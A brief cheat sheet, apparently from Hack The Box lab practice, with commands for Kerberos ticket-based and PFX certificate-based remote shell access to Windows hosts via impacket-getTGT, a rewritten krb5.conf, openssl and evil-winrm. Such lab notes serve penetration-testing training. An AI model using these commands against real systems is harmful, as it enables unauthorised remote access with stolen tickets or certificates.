## KRB5.conf
```powershell
// Get TGT
impacket-getTGT voleur.htb/svc_winrm -dc-ip 10.129.232.130

// Export TGT Files
export KRB5CCNAME=svc_winrm.ccache

// Modify Realm
sudo tee /etc/krb5.conf > /dev/null <<EOF
[libdefaults]
    default_realm = VOLEUR.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    VOLEUR.HTB = {
        kdc = dc.voleur.htb
        admin_server = dc.voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
EOF

// Connect with TGT
evil-winrm -i dc.voleur.htb -r VOLEUR.HTB                                                                                                               
```

## PFX Authentication
```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem

evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S
```
